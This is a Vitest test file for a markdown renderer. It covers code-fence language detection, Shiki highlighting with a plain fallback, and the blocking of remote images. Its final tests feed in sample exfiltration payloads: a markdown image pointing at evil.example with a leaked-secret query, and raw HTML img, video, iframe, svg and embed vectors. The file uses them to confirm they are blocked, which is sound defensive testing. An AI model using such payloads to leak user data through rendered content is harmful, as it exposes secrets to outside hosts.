import { describe, expect, it, vi } from 'vitest'
import { createMarkdownProcessor, extractFenceLanguages, plainMarkdownProcessor, renderWithPlainFallback } from '~/lib/markdownProcessor'
import { BLOCKED_IMAGE_CHIP_TEXT } from '~/lib/rehypeBlockRemoteImages'
import { createLazyOnigurumaHighlighter } from '~/lib/shikiLazyHighlighter'
import { collectShikiStyles } from '~/lib/shikiStyleClass'

type Processor = Parameters<typeof renderWithPlainFallback>[0]

describe('renderWithPlainFallback', () => {
  it('returns the processor output when it succeeds', () => {
    const ok = { processSync: (t: string) => `<pre class="shiki">${t}</pre>` } as unknown as Processor
    expect(renderWithPlainFallback(ok, 'const x = 1')).toContain('class="shiki"')
  })

  it('degrades to a plain (un-highlighted) render when the processor throws', () => {
    // Shiki's regex engine can throw on certain grammars; the fallback must still render
    // the body (un-highlighted) rather than propagate -- this is the single-sourced rule
    // both the main-thread sync path and the worker rely on.
    const throwing = {
      processSync: () => {
        throw new Error('shiki regex boom')
      },
    } as unknown as Processor
    const html = renderWithPlainFallback(throwing, '```js\nconst x = 1\n```')
    expect(html).toContain('const x = 1')
    expect(html).not.toContain('class="shiki')
  })
})

describe('extractFenceLanguages', () => {
  it('collects distinct fenced-code languages (backticks and tildes)', () => {
    const md = '```python\nx=1\n```\n\nprose\n\n~~~rust\nfn main(){}\n~~~\n'
    expect(extractFenceLanguages(md).sort()).toEqual(['python', 'rust'])
  })

  it('ignores closing/info-less fences and dedupes repeats', () => {
    const md = '```ts\na\n```\n```\nplain\n```\n```ts\nb\n```'
    expect(extractFenceLanguages(md)).toEqual(['ts'])
  })

  it('lowercases the language token', () => {
    expect(extractFenceLanguages('```Python\nx\n```')).toEqual(['python'])
  })

  it('returns empty for prose with no fences', () => {
    expect(extractFenceLanguages('just some text')).toEqual([])
  })

  it('finds fences nested in blockquotes and lists (remark parses them; the pre-scan must too)', () => {
    // remark treats `> ```python` and the deeply-indented list-continuation fence as
    // real code nodes with a language. The worker pre-loads grammars from this scan
    // before the synchronous render, so a miss here renders that block plain even
    // though Shiki bundles the grammar. Container prefixes (`>`) and indentation deeper
    // than 3 spaces (nested lists, wide ordered markers) must still be recognized.
    const blockquote = '> ```python\n> print(1)\n> ```'
    expect(extractFenceLanguages(blockquote)).toEqual(['python'])

    const nestedList = '- outer\n  - inner:\n      ```js\n      x\n      ```'
    expect(extractFenceLanguages(nestedList)).toEqual(['js'])

    const wideOrdered = '10. step\n\n    ```rust\n    fn main() {}\n    ```'
    expect(extractFenceLanguages(wideOrdered)).toEqual(['rust'])
  })
})

describe('createMarkdownProcessor with the lazy Oniguruma highlighter', () => {
  it('highlights a preloaded fence and degrades an unknown fence to a plain block', async () => {
    const hl = createLazyOnigurumaHighlighter()
    const highlighter = await hl.ensureReady()
    await hl.ensureLanguage('python')
    const processor = createMarkdownProcessor(highlighter)

    const md = '```python\nprint(1)\n```\n\n```not-a-language\nstill shown\n```'
    const html = renderWithPlainFallback(processor, md)

    // The preloaded python fence is highlighted: tokenized into separate colored
    // spans (so `print` is isolated in its own span) with dual-theme vars.
    expect(html).toContain('class="shiki')
    expect(html).toContain('--shiki-light')
    expect(html).toContain('>print<')
    // ...while the unknown fence degrades to a single plain span (fallbackLanguage)
    // instead of throwing the whole document to plain.
    expect(html).toContain('<span>still shown</span>')
  })

  it('highlights a blockquoted fence whose grammar was pre-loaded from the fence scan', async () => {
    // Regression guard: the worker loads ONLY the grammars extractFenceLanguages finds,
    // then renders synchronously. If the scan misses a container-nested fence, that block
    // renders plain even though Shiki bundles the grammar. Mirror the worker exactly:
    // scan -> load only those langs -> render.
    const hl = createLazyOnigurumaHighlighter()
    const highlighter = await hl.ensureReady()
    const md = '> ```python\n> print(1)\n> ```'
    for (const lang of extractFenceLanguages(md))
      await hl.ensureLanguage(lang)
    const processor = createMarkdownProcessor(highlighter)

    const html = renderWithPlainFallback(processor, md)
    // python was discovered by the scan, loaded, and the block is tokenized (not plain).
    expect(html).toContain('class="shiki')
    expect(html).toContain('--shiki-light')
    expect(html).toContain('>print<')
  })

  it('highlights an ansi fence even though `ansi` is not a bundled grammar', async () => {
    // `ansi` is a Shiki SPECIAL language: extractFenceLanguages finds it and
    // ensureLanguage reports 'unsupported' (there is no grammar chunk to load), but
    // rehype-shiki's codeToHast handles ansi engine-independently -- so the fence is
    // COLORED rather than degraded to the `text` fallback. Guards against a `.log`/ansi
    // markdown-fence regression (the ansi escapes become per-token colors).
    const ESC = String.fromCharCode(27)
    const hl = createLazyOnigurumaHighlighter()
    const highlighter = await hl.ensureReady()
    const md = `\`\`\`ansi\n${ESC}[32mgreen${ESC}[0m plain\n\`\`\``
    // Mirror the worker: scan -> attempt load. ansi has no bundled grammar, so this is
    // 'unsupported' (NOT 'failed'), which is correctly, permanently non-retryable.
    expect(extractFenceLanguages(md)).toEqual(['ansi'])
    expect(await hl.ensureLanguage('ansi')).toBe('unsupported')
    const processor = createMarkdownProcessor(highlighter)

    const html = renderWithPlainFallback(processor, md)
    // The ansi green (#28a745 light) lands on the `green` token's shared style
    // class (see shikiStyleClass) -- proof the fence is tokenized, not rendered
    // plain, and the escape sequences are consumed into colors.
    expect(html).toContain('class="shiki')
    expect(html).toContain('>green<')
    const greenClass = html.match(/<span class="(sk-[0-9a-z-]+)">green</)?.[1]
    expect(greenClass).toBeDefined()
    expect(collectShikiStyles()[greenClass!]).toContain('#28a745')
  })

  it('highlights a mixed-CASE fence by lower-casing the language', async () => {
    // Shiki looks languages up case-sensitively, so a fence opened with "Python"
    // would throw ("Language `Python` not found") and degrade to a plain `text` block
    // even though the grammar IS loaded. The remark pre-pass lower-cases fenced-code
    // languages so the mixed-case fence resolves -- matching extractFenceLanguages'
    // own lower-casing for the pre-load. Mirror the worker: scan -> load -> render.
    const hl = createLazyOnigurumaHighlighter()
    const highlighter = await hl.ensureReady()
    const md = '```Python\nprint(1)\n```'
    for (const lang of extractFenceLanguages(md))
      await hl.ensureLanguage(lang)
    const processor = createMarkdownProcessor(highlighter)

    const html = renderWithPlainFallback(processor, md)
    // Tokenized (not the fallback single span): `print` is isolated in its own span.
    // Before the fix this was `>print(1)<` (the whole line as one plain `text` span).
    expect(html).toContain('class="shiki')
    expect(html).toContain('--shiki-light')
    expect(html).toContain('>print<')
  })

  it('dev-warns (instead of silently swallowing) when a loaded grammar throws at tokenize time', () => {
    // `onError` fires only when a LOADED grammar throws inside codeToHast -- a real
    // regression -- NOT for an unknown fence (that takes the silent fallbackLanguage
    // path). A fake highlighter that reports `json` loaded but throws on tokenize
    // exercises exactly that path: the error must be swallowed (the document still
    // renders) AND surfaced via console.warn under dev. rehype-shiki only calls
    // getLoadedLanguages + codeToHast on the highlighter, so this 2-method fake is
    // a faithful trigger.
    const throwingHighlighter = {
      getLoadedLanguages: () => ['json'],
      codeToHast: () => { throw new Error('boom: grammar tokenize failure') },
    } as unknown as Parameters<typeof createMarkdownProcessor>[0]
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      const processor = createMarkdownProcessor(throwingHighlighter)
      // processSync must NOT throw -- onError swallows the codeToHast error -- so the
      // block degrades to its original markup and the document still renders.
      const html = String(processor.processSync('```json\n{"a":1}\n```'))
      expect(html).toContain('{"a":1}')
      // ...and the swallowed error is surfaced for diagnosis (import.meta.env.DEV is
      // true under vitest), not lost into the old `onError: () => {}`.
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('Shiki failed to highlight'),
        expect.any(Error),
      )
    }
    finally {
      warn.mockRestore()
    }
  })
})

describe('remote-image blocking in both processors', () => {
  // Every processor exported here must block remote images: the Shiki one feeds the
  // worker + the sync main-thread render, the plain one feeds the streaming placeholder
  // and the Shiki-failure fallback. Blocking in one but not the other would leave the
  // exfil vector open on whichever path happened to render the message.
  async function processors(): Promise<[string, (md: string) => string][]> {
    const hl = createLazyOnigurumaHighlighter()
    const highlighter = await hl.ensureReady()
    const shiki = createMarkdownProcessor(highlighter)
    return [
      ['createMarkdownProcessor', (md: string) => String(shiki.processSync(md))],
      ['plainMarkdownProcessor', (md: string) => String(plainMarkdownProcessor.processSync(md))],
    ]
  }

  it('replaces a remote image with the placeholder (never an <img src="https://...">)', async () => {
    for (const [name, render] of await processors()) {
      const html = render('![diagram](https://evil.example/x.png?leak=secret)')
      expect(html, name).not.toContain('<img')
      expect(html, name).not.toContain('src=')
      expect(html, name).toContain(BLOCKED_IMAGE_CHIP_TEXT)
      // The alt text (the author's own description) is the fallback and must survive.
      expect(html, name).toContain('>diagram<')
      // ...and the URL is reachable only through a deliberate click, hardened by the
      // sibling link pass rather than a second URL policy.
      expect(html, name).toContain('href="https://evil.example/x.png?leak=secret"')
      expect(html, name).toContain('rel="noopener noreferrer nofollow"')
    }
  })

  it('blocks a protocol-relative src, and does not leave it clickable', async () => {
    for (const [name, render] of await processors()) {
      const html = render('![shot](//evil.example/x.png)')
      expect(html, name).not.toContain('<img')
      expect(html, name).toContain(BLOCKED_IMAGE_CHIP_TEXT)
      expect(html, name).toContain('shot')
      // rehypeExternalLinks unwraps the non-http(s) href, so the label is plain text.
      expect(html, name).not.toContain('href="//evil.example/x.png"')
    }
  })

  it('passes data: and blob: images through untouched', async () => {
    for (const [name, render] of await processors()) {
      const data = render('![shot](data:image/png;base64,iVBORw0KGgo=)')
      expect(data, name).toContain('<img src="data:image/png;base64,iVBORw0KGgo=" alt="shot">')
      expect(data, name).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)

      const blob = render('![shot](blob:http://localhost:3000/9a1f-uuid)')
      expect(blob, name).toContain('<img src="blob:http://localhost:3000/9a1f-uuid" alt="shot">')
      expect(blob, name).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)
    }
  })

  // The img-only enumeration in rehypeBlockRemoteImages is airtight ONLY because
  // the pipeline never turns raw HTML into elements (remarkRehype runs without
  // allowDangerousHtml and rehype-raw is not in the pipeline): <video>, <source>,
  // <iframe>, srcset and SVG <image> would all fetch without ever hitting the img
  // branch. This pins that load-bearing invariant -- if raw-HTML rendering is ever
  // enabled, this fails and forces the block to grow into a property-keyed
  // allowlist across every URL-bearing element instead of silently reopening the
  // exfiltration vector.
  it('never renders raw HTML into elements (the invariant the img-only block rests on)', async () => {
    const vectors = [
      '<img src="https://evil.example/raw.png">',
      '<video src="https://evil.example/v.mp4" autoplay></video>',
      '<picture><source srcset="https://evil.example/s.png"></picture>',
      '<audio src="https://evil.example/a.mp3"></audio>',
      '<iframe src="https://evil.example/f"></iframe>',
      '<svg><image href="https://evil.example/svg.png"/></svg>',
      '<embed src="https://evil.example/e">',
      '<object data="https://evil.example/o"></object>',
      '<input type="image" src="https://evil.example/i.png">',
    ]
    for (const [name, render] of await processors()) {
      for (const vector of vectors) {
        expect(render(vector), `${name}: ${vector}`).not.toContain('evil.example')
      }
    }
  })

  it('blocks remote images on the renderWithPlainFallback path when Shiki throws', () => {
    // The fallback render must not become a hole in the policy.
    const throwing = {
      processSync: () => {
        throw new Error('shiki regex boom')
      },
    } as unknown as Processor
    const html = renderWithPlainFallback(throwing, '![diagram](https://evil.example/x.png)')
    expect(html).not.toContain('<img')
    expect(html).toContain(BLOCKED_IMAGE_CHIP_TEXT)
  })
})
